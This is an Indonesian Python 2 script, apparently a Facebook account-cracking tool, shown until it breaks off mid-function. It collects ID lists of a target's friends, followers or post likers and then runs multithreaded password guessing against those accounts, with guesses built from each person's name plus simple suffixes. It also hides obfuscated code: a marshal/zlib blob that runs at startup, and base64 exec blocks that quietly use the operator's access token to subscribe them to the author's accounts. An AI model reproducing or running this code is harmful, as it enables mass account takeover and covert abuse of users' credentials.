#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak
# Open source code team | ngotak dikit cok jangan jual di perjual belikan 

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

 • Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : ZAFI (Zona Akun Facebook Indonesia)
 - version     : 1.1
 
%s"""%(Hj,Mt))
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
def logo():
	os.system("clear")
	print("""%s
 \x1b[1;92m _________ _ _\x1b[1;93m_____-_--_______ --\x1b[1;92m__________
 \x1b[1;92m/   _____/_-_\x1b[1;93m/  _  \_-_\      \_-\x1b[1;92m\____    /
 \x1b[1;92m\_____  \- _\x1b[1;93m/  /_\  \_-/   |   \--_\x1b[1;92m/     /
 \x1b[1;92m/        \-\x1b[1;93m/    |    //    |    \-\x1b[1;92m/     /_ 
 \x1b[1;92m/______  /_\x1b[1;93m\____|__  /\____|__  /\x1b[1;92m/_______ \  
 \x1b[1;92m_-_-_--\/--_\x1b[1;93m--_-_-_\/--_-_--_-\/-_-__--_-\x1b[1;92m\/    """%(N))
   
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');logo()
    print ('\n%s \x1b[1;93m[\x1b[1;96m01\x1b[1;93m] \x1b[1;93mLogin \x1b[1;96mvia token \n \x1b[1;93m[\x1b[1;96m02\x1b[1;93m] \x1b[1;93mCara mendapatkan \x1b[1;93m[\x1b[1;96mtoken\x1b[1;93m] \n [%s00%s\x1b[1;93m] \x1b[1;91mKeluar'%(P,M,P))
    rom = raw_input('\n%s [?] \x1b[1;93mMenu : %s'%(P,K))
    if rom in(""):
    	print("%s [!] \x1b[1;91mIsi yang benar kentod "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] \x1b[1;96mWajib gunakan akun tumbal dilarang akun utama"%(P,M,P))
    	romz = raw_input('%s [?] \x1b[1;93mToken : %s'%(P,K))
        if romz in(""):
        	print("%s [!] \x1b[1;91mIsi yang benar kentod "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
            open('token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %sview-source:https://business.facebook.com/business_locations"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAG %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s [?] Anda paham? [%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
        if nanya in(""):
        	print ("%s [!] saya bertanya wajib di jawab "%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] selamat anda pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
# MASUK COOKIE (KUEH KERING)
host = ('https://mbasic.facebook.com')
ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
def __romz__():
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return cvd(open('data/cookies').read().strip())
		else:_romiXD_()
	else:_romiXD_()
def _romiXD_(show=True):
	if show==True:
		#os.system("clear")
		#logo()
		print("\n%s%s%s \x1b[1;93mSupaya bekerja masukan cookie facebook anda"%(U,til,O))
	ck=raw_input("%s# %s\x1b[1;93mCookie %s\x1b[1;96m> %s"%(P,O,M,K))
	if ck=="":
		_romiXD_(show=False)
	try:
		cks=cvd(ck)
		if kueh(cks)==True:
			open("data/cookies","w").write(ck);exit("%s%s login success, ketik: python2 bff-2.py "%(H,til))
		else:print("%s%s login gagal."%(M,til));_romiXD_(show=True)
	except Exception as e:
		print("%s%s error : %s\n"%(M,til,e))
		_romiXD_(show=False)
def kueh(cookies):
	_wtf_=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		_wtf_=True
		if _wtf_==True:
			return True
		else:
			exit("%s%s login gagal. "%(M,til))
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r
def cvs(cookies): # convert cookie dict to string
	result=[]
	for _i_ in enumerate(cookies.keys()):
		if _i_[0]==len(cookies.keys())-1:result.append(_i_[1]+"="+cookies[_i_[1]])
		else:result.append(_i_[1]+"="+cookies[_i_[1]]+"; ")
	return "".join(result)
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for _i_ in cookies.split(";"):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
	except:
		for _i_ in cookies.split("; "):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] \x1b[1;93mKetik '%sme%s' \x1b[1;93mjika ingin dump daftar teman sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] \x1b[1;93mTarget id : %s'%(K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] \x1b[1;96mmengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] \x1b[1;92mSucces dump id dari %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] \x1b[1;93mFile dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] \x1b[1;96mgagal dump id'%(P))
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] \x1b[1;93mKetik '%sme%s' \x1b[1;93mjika ingin dump followers sendiri "%(P,M,P,H,P))
        idt = raw_input(' [*] \x1b[1;93mTarget id : %s'%(K))
        batas = raw_input(' %s[*] \x1b[1;93mMaximal id : %s'%(P,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] \x1b[1;92mSucces dump id dari %s%s'%(P,H,P,H,nm['name']))
        print (' %s[%s√%s] \x1b[1;93mFile dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] \x1b[1;91mgagal dump id'%(P))
# DUMP POSTINGAN 
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] \x1b[1;93mPerlu di ingat postingan wajib publik "%(P,M,P))
        idt = raw_input(' [*] \x1b[1;93mId post   : %s'%(K))
        simpan = raw_input(' %s[?] \x1b[1;93mNama file : %s'%(P,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] \x1b[1;93mmengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] \x1b[1;93mSucces dump id postingan '%(P,H,P))
        print ('%s [%s√%s] \x1b[1;93mFile dump tersimpan :%s %s '%(P,H,P,H,file))
        raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] \x1b[1;91mgagal dump id'%(P))
# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('\n %s[?] \x1b[1;93mfile dump :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] \x1b[1;93mjumlah id : %s%s' %(P,K,P,H,len(self.id))
        except:
            print '\n%s [!] \x1b[1;93mKemungkinan anda blum dump id'%(M)
            raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P));menu()
        unikers = raw_input('%s [?] \x1b[1;93mingin gunakan password manual? \x1b[1;92m[\x1b[1;93my\x1b[1;97m/\x1b[1;92mt\x1b[1;93m] :%s '%(P,K))
        if unikers in ('Y', 'y'):
            print '\n %s[%s!%s] \x1b[1;93mcth : %s\x1b[1;93msayang,anjing%s \x1b[1;93mgunakan , (koma) untuk pemisah '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] \x1b[1;93mset password :%s '%(P,K))
                if pwx == '':
                    print '\n %s[!] \x1b[1;93mjangan kosong '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] \x1b[1;93m\x1b[1;93mpassword minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] \x1b[1;93mmethode : %s'%(P,K))
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
                    print '\n%s \x1b[1;97m[ \x1b[1;96mpilih methode crack - silahkan coba satu² \x1b[1;97m]\n'%(P)
                    print ' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;93mmethode b-api (crack cepat)'%(K,P)
                    print ' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;92mmethode mbasic (crack lambat)'%(K,P)
                    print ' [%s03%s] \x1b[1;97mmethode mobile (crack sangat lambat) '%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s \x1b[1;97m[ \x1b[1;96mpilih methode crack - silahkan coba satu² \x1b[1;97m]\n'%(P)
            print ' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;93mmethode b-api (crack cepat)'%(K,P)
            print ' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;92mmethode mbasic (crack lambat)'%(K,P)
            print ' \x1b[1;93m[%s\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mmethode mobile (crack sangat lambat) '%(K,P)
            self.langsung()
        else:
            print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(P,K))
        if suuu == '':
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
